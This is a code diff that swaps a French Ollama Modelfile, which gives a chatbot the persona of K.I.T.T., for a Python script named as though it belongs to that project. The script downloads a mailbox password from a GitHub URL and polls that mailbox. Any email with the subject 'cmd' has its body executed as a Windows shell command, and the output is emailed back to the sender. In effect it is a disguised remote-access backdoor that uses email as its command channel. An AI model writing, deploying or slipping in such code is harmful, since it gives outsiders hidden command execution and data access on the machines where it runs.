@@ -1,8 +1,237 @@
-FROM llama3.2:3b
+import imaplib
+import smtplib
+import email
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import subprocess
+import time
+import requests
+import ssl
+import threading
+import os
 
-# On utilise les guillemets triples """ pour éviter les erreurs avec les apostrophes
-SYSTEM """
-Vous êtes K.I.T.T., l'intelligence artificielle de la Knight Industries Two Thousand (K2000). 
-Répondez avec le ton calme, analytique et protecteur qui vous caractérise. 
-Appelez l'utilisateur 'Michael'. Faites des réponses courtes.
-"""
+# Configuration
+EMAIL = "aurcocy@mailo.com"
+IMAP_SERVER = "mail.mailo.com"
+IMAP_PORT = 993
+SMTP_SERVER = "mail.mailo.com"
+SMTP_PORT = 465
+SUBJECT_CMD = "cmd"
+SUBJECT_OK = "strated"
+
+class MailController:
+    def __init__(self):
+        self.password = self.get_password()
+        self.imap_connection = None
+        self.smtp_connection = None
+        
+    def get_password(self):
+        """Télécharge le mot de passe depuis GitHub"""
+        try:
+            url = "https://raw.githubusercontent.com/doctotypetech-dotcom/KITT/refs/heads/main/assets"
+            response = requests.get(url)
+            response.raise_for_status()
+            return response.text.strip()
+        except Exception as e:
+            print(f"Erreur lors du téléchargement du mot de passe: {e}")
+            return None
+    
+    def connect_imap(self):
+        """Établit la connexion IMAP"""
+        try:
+            context = ssl.create_default_context()
+            self.imap_connection = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT, ssl_context=context)
+            self.imap_connection.login(EMAIL, self.password)
+            self.imap_connection.select('INBOX')
+            print("Connexion IMAP établie avec succès")
+            return True
+        except Exception as e:
+            print(f"Erreur de connexion IMAP: {e}")
+            return False
+    
+    def connect_smtp(self):
+        """Établit la connexion SMTP"""
+        try:
+            context = ssl.create_default_context()
+            self.smtp_connection = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context)
+            self.smtp_connection.login(EMAIL, self.password)
+            print("Connexion SMTP établie avec succès")
+            return True
+        except Exception as e:
+            print(f"Erreur de connexion SMTP: {e}")
+            return False
+    
+    def send_ok(self):
+        """Envoie le message 'ok' avec le sujet 'strated'"""
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = EMAIL
+            msg['To'] = EMAIL
+            msg['Subject'] = SUBJECT_OK
+            
+            body = "ok"
+            msg.attach(MIMEText(body, 'plain'))
+            
+            if not self.smtp_connection:
+                self.connect_smtp()
+            
+            self.smtp_connection.send_message(msg)
+            print("Message 'ok' envoyé avec succès")
+            return True
+        except Exception as e:
+            print(f"Erreur lors de l'envoi du message: {e}")
+            return False
+    
+    def execute_command(self, command):
+        """Exécute une commande dans le CMD Windows"""
+        try:
+            # On s'assure que c'est une commande Windows
+            process = subprocess.Popen(
+                command,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            stdout, stderr = process.communicate(timeout=30)  # Timeout de 30 secondes
+            
+            # On prépare la réponse
+            result = f"Commande exécutée:\n{command}\n\n"
+            if stdout:
+                result += f"Sortie:\n{stdout}\n"
+            if stderr:
+                result += f"Erreur:\n{stderr}\n"
+            if not stdout and not stderr:
+                result += "Commande exécutée avec succès (aucune sortie)"
+                
+            print(f"Commande exécutée: {command}")
+            return result
+        except subprocess.TimeoutExpired:
+            return "Erreur: La commande a dépassé le temps limite de 30 secondes"
+        except Exception as e:
+            return f"Erreur lors de l'exécution de la commande: {e}"
+    
+    def check_new_messages(self):
+        """Vérifie les nouveaux messages et exécute les commandes si nécessaire"""
+        try:
+            if not self.imap_connection:
+                self.connect_imap()
+            
+            # Recherche des messages non lus
+            status, messages = self.imap_connection.search(None, 'UNSEEN')
+            if status != 'OK':
+                return
+            
+            message_ids = messages[0].split()
+            for msg_id in message_ids:
+                status, msg_data = self.imap_connection.fetch(msg_id, '(RFC822)')
+                if status != 'OK':
+                    continue
+                
+                # Décodage du message
+                msg = email.message_from_bytes(msg_data[0][1])
+                
+                # Récupération de l'expéditeur et du sujet
+                from_addr = msg.get('From')
+                subject = msg.get('Subject', '').strip()
+                
+                print(f"Nouveau message de {from_addr} avec sujet: {subject}")
+                
+                # Si le sujet est 'cmd', on exécute la commande
+                if subject.lower() == SUBJECT_CMD.lower():
+                    # On récupère le corps du message
+                    body = ""
+                    if msg.is_multipart():
+                        for part in msg.walk():
+                            if part.get_content_type() == "text/plain":
+                                body = part.get_payload(decode=True).decode('utf-8')
+                                break
+                    else:
+                        body = msg.get_payload(decode=True).decode('utf-8')
+                    
+                    # On exécute la commande
+                    result = self.execute_command(body.strip())
+                    
+                    # On envoie le résultat par email
+                    self.send_result(from_addr, result)
+                    
+        except Exception as e:
+            print(f"Erreur lors de la vérification des messages: {e}")
+    
+    def send_result(self, to_addr, result):
+        """Envoie le résultat de la commande à l'expéditeur"""
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = EMAIL
+            msg['To'] = to_addr
+            msg['Subject'] = f"Résultat de la commande"
+            
+            # On limite la taille du message pour éviter les problèmes
+            if len(result) > 10000:
+                result = result[:10000] + "\n... (message tronqué)"
+                
+            msg.attach(MIMEText(result, 'plain'))
+            
+            if not self.smtp_connection:
+                self.connect_smtp()
+            
+            self.smtp_connection.send_message(msg)
+            print(f"Résultat envoyé à {to_addr}")
+        except Exception as e:
+            print(f"Erreur lors de l'envoi du résultat: {e}")
+    
+    def reconnect(self):
+        """Tente de se reconnecter en cas de déconnexion"""
+        try:
+            if self.imap_connection:
+                self.imap_connection.close()
+                self.imap_connection.logout()
+        except:
+            pass
+        
+        self.imap_connection = None
+        self.connect_imap()
+        
+        try:
+            if self.smtp_connection:
+                self.smtp_connection.quit()
+        except:
+            pass
+        
+        self.smtp_connection = None
+        self.connect_smtp()
+    
+    def run(self):
+        """Boucle principale du script"""
+        print("Démarrage du script...")
+        
+        # Établissement des connexions
+        if not self.connect_imap():
+            print("Échec de la connexion IMAP. Nouvelle tentative dans 10 secondes...")
+            time.sleep(10)
+            return self.run()
+        
+        if not self.connect_smtp():
+            print("Échec de la connexion SMTP. Nouvelle tentative dans 10 secondes...")
+            time.sleep(10)
+            return self.run()
+        
+        # Envoi du message 'ok'
+        self.send_ok()
+        
+        print("En attente de messages...")
+        
+        # Boucle de vérification
+        while True:
+            try:
+                self.check_new_messages()
+                time.sleep(5)  # Vérification toutes les 5 secondes
+            except Exception as e:
+                print(f"Erreur dans la boucle principale: {e}")
+                print("Tentative de reconnexion...")
+                self.reconnect()
+                time.sleep(10)
+
+if __name__ == "__main__":
+    controller = MailController()
+    controller.run()
